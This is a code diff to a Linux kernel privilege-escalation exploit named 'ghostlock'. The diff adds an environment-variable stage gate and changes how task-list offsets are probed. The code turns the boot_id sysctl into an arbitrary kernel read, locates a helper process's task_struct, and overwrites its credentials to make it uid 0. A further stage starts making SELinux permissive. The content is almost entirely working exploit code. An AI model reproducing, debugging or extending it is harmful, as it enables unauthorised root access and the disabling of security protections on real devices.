@@ -115,7 +115,7 @@ namespace ghostlock::session::backend {
         constexpr uintptr_t kTaskCredOff = 0x780ULL;
         constexpr uintptr_t kTaskCommOff = 0x790ULL;
         constexpr uintptr_t kHelperCommTag = 0x76326c74736f6867ULL; /* "ghostl2v" LE */
-        constexpr int32_t kSysctlWalkSteps = 40;
+        constexpr int32_t kSysctlWalkSteps = 15;
 
         bool read_boot_id16(unsigned char out[16]) {
             int p[2];
@@ -206,6 +206,15 @@ namespace ghostlock::session::backend {
 
         template <class M>
         bool sysctl_2v_path(ExploitSession &session) {
+            /* ---- stage gate: GL_STAGE=1..5 stops after that stage ----
+             * Diagnostic mode: run one stage per boot to localise the crash.
+             * Lower stages return false (exploit reported failed) after
+             * printing STAGE{n}_OK. */
+            int32_t stage = 5;
+            const char *se = getenv("GL_STAGE");
+            if (se && *se && atoi(se) > 0) stage = atoi(se);
+            if (stage > 5) stage = 5;
+
             /* ---- S0: hijack boot_id ctl_table.data := &nfulnl_logger ----
              * From then on, /proc/sys/kernel/random/boot_id reads 16 bytes at
              * whatever address we last wrote into the data field. */
@@ -230,12 +239,20 @@ namespace ghostlock::session::backend {
                     return false;
                 }
             }
+            if (stage <= 1) {
+                pr_success("STAGE1_OK: S0 hijack + readback verified "
+                           "(stage gate, stopping)\n");
+                return false;
+            }
 
-            /* ---- S1: auto-probe TASK_TASKS_OFF on init_task's ring ----
-             * 5.10 task_struct.tasks sits in 0x100..0x300; the entry's next
-             * points at (some task)+off and that task's prev points back. */
+            /* ---- S1: validate TASK_TASKS_OFF on init_task's ring ----
+             * 2V conf says tasks=1224 (0x4c8). Try that first, then a short
+             * fallback list. Ring check: entry->next points at (task)+off and
+             * (task)+off+8 (prev) points back at init_task+off. */
+            static const uintptr_t kTasksCandidates[] = {
+                0x4c8, 0x1c0, 0x1c8, 0x1d0, 0x200, 0x180};
             uintptr_t tasks_off = 0;
-            for (uintptr_t off = 0x100; off < 0x300 && !tasks_off; off += 8) {
+            for (uintptr_t off : kTasksCandidates) {
                 const uint64_t next = sysctl_read64<M>(
                     session, kInitTask2v + off, "SYS1: ring next");
                 if (!next || next < 0xffffff8000000000ULL ||
@@ -257,6 +274,11 @@ namespace ghostlock::session::backend {
             }
             if (!tasks_off) {
                 pr_warning("SYS1: could not locate the tasks ring\n");
+                return false;
+            }
+            if (stage <= 2) {
+                pr_success("STAGE2_OK: tasks ring located at 0x%zx "
+                           "(stage gate, stopping)\n", tasks_off);
                 return false;
             }
 
@@ -302,6 +324,14 @@ namespace ghostlock::session::backend {
                 close(notify[0]);
                 return false;
             }
+            if (stage <= 3) {
+                pr_success("STAGE3_OK: helper task found at 0x%016zx "
+                           "(stage gate, stopping)\n", helper_task);
+                kill(helper, SIGKILL);
+                (void)waitpid(helper, nullptr, 0);
+                close(notify[0]);
+                return false;
+            }
 
             /* ---- S4: read the current cred pointer (read sanity) ---- */
             const uint64_t old_cred = sysctl_read64<M>(
@@ -339,6 +369,13 @@ namespace ghostlock::session::backend {
                 return false;
             }
             pr_success("SYS5: helper is uid 0\n");
+            if (stage <= 4) {
+                pr_success("STAGE4_OK: helper rooted (stage gate, stopping)\n");
+                kill(helper, SIGKILL);
+                (void)waitpid(helper, nullptr, 0);
+                close(notify[0]);
+                return false;
+            }
 
             /* ---- S6: make SELinux permissive ----
              * Read the first 16 bytes of selinux_state to find which byte is
